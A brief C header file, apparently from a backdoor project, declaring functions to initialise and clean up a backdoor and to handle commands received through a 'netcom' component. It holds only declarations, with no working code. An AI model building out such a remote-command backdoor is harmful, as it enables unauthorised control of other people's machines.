#ifndef BACKDOOR_H
#define BACKDOOR_H

int init_backdoor(void);
void cleanup_backdoor(void);

// Called by netcom when a command is received
void handle_command(const char *cmd_line);

#endif
